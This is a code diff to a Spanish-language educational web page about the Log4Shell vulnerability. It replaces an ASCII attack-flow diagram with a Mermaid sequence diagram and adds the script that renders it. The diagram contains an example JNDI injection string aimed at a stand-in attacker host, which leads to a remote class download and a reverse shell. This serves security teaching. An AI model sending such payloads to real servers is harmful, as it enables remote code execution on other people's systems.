@@ -118,18 +118,26 @@
 <p>Cuando Log4j procesaba un mensaje que contenía esta cadena (por ejemplo, en la cabecera <code>User-Agent</code> de una petición HTTP), intentaba contactar con el servidor LDAP del atacante y descargar una clase Java ejecutable.</p>
 <hr>
 <h2>Flujo del ataque</h2>
-<div class="code-wrapper" style="position: relative;">
-      <button class="code-copy-btn" onclick="copyCodeSnippet(this)">Copiar</button>
-      <pre class="language-text"><code class="language-text">[Atacante] --( Petición HTTP con payload ${jndi:...} )--&gt; [Servidor Vulnerable (Log4j)]
-                                                                    |
-                                                            (Consulta LDAP JNDI)
-                                                                    v
-[Servidor LDAP Malicioso] &lt;-----------------------------------------+
-       |
-  (Envía clase Java maliciosa)
-       v
-[Servidor Vulnerable] ===&gt; ¡Ejecución remota de código en contexto de aplicación!
-</code></pre>
+<div class="diagram-container">
+      <div class="diagram-header">
+        <span class="diagram-badge">Diagrama interactivo</span>
+      </div>
+      <div class="mermaid">sequenceDiagram
+    autonumber
+    actor Attacker as 🦹 Atacante
+    participant App as 🖥️ Servidor vulnerable (Log4j 2)
+    participant LDAP as 💀 Servidor LDAP malicioso
+    participant Web as 🌐 Servidor HTTP de payload
+
+    Attacker->>App: 1. Envía petición HTTP con User-Agent: ${jndi:ldap://atacante.com/Exploit}
+    Note over App: Log4j evalúa ${jndi:...} y ejecuta consulta JNDI
+    App->>LDAP: 2. Consulta LDAP hacia servidor del atacante
+    LDAP-->>App: 3. Devuelve referencia a clase remota (http://atacante.com/Exploit.class)
+    App->>Web: 4. Descarga clase Java compilada maliciosa
+    Web-->>App: 5. Entrega Exploit.class
+    Note over App: Carga y ejecuta el código estático de la clase
+    App-->>Attacker: 6. Shell reversa establecida (RCE en servidor)
+</div>
     </div>
 <hr>
 <h2>Detección y mitigación</h2>
@@ -200,10 +208,69 @@ level: critical
 
   <!-- Scripts -->
   <script src="../../assets/js/prism.js"></script>
+  <script src="../../assets/js/mermaid.min.js"></script>
   <script>
     document.addEventListener('DOMContentLoaded', () => {
       const themeToggleBtn = document.getElementById('theme-toggle');
       let currentTheme = localStorage.getItem('cibercelia-theme') || 'dark';
+
+      function initMermaid(theme) {
+        if (!window.mermaid) return;
+        const isDark = theme === 'dark';
+        try {
+          mermaid.initialize({
+            startOnLoad: false,
+            theme: isDark ? 'dark' : 'default',
+            themeVariables: isDark ? {
+              darkMode: true,
+              background: '#111827',
+              primaryColor: '#1e293b',
+              primaryTextColor: '#f8fafc',
+              primaryBorderColor: '#00f0ff',
+              lineColor: '#00f0ff',
+              secondaryColor: '#334155',
+              tertiaryColor: '#0f172a',
+              noteBkgColor: '#1e293b',
+              noteTextColor: '#f8fafc',
+              noteBorderColor: '#00f0ff',
+              actorBkg: '#1e293b',
+              actorTextColor: '#f8fafc',
+              actorBorder: '#00f0ff',
+              signalColor: '#00f0ff',
+              signalTextColor: '#f8fafc',
+              labelBoxBkgColor: '#1e293b',
+              labelBoxBorderColor: '#00f0ff',
+              labelTextColor: '#f8fafc',
+              loopTextColor: '#f8fafc'
+            } : {
+              darkMode: false,
+              background: '#ffffff',
+              primaryColor: '#f0f9ff',
+              primaryTextColor: '#0f172a',
+              primaryBorderColor: '#0284c7',
+              lineColor: '#0284c7',
+              secondaryColor: '#f1f5f9',
+              tertiaryColor: '#ffffff',
+              noteBkgColor: '#f8fafc',
+              noteTextColor: '#0f172a',
+              noteBorderColor: '#0284c7',
+              actorBkg: '#f0f9ff',
+              actorTextColor: '#0f172a',
+              actorBorder: '#0284c7',
+              signalColor: '#0284c7',
+              signalTextColor: '#0f172a',
+              labelBoxBkgColor: '#f0f9ff',
+              labelBoxBorderColor: '#0284c7',
+              labelTextColor: '#0f172a',
+              loopTextColor: '#0f172a'
+            },
+            fontFamily: 'Inter, sans-serif'
+          });
+          mermaid.run({ querySelector: '.mermaid' });
+        } catch (e) {
+          console.error('Error rendering Mermaid diagram:', e);
+        }
+      }
 
       function applyTheme(theme) {
         document.documentElement.setAttribute('data-theme', theme);
@@ -216,11 +283,14 @@ level: critical
       }
 
       applyTheme(currentTheme);
+      initMermaid(currentTheme);
 
       if (themeToggleBtn) {
         themeToggleBtn.addEventListener('click', () => {
           currentTheme = currentTheme === 'dark' ? 'light' : 'dark';
           applyTheme(currentTheme);
+          // Reload page to re-render SVG with clean theme palette
+          window.location.reload();
         });
       }
 
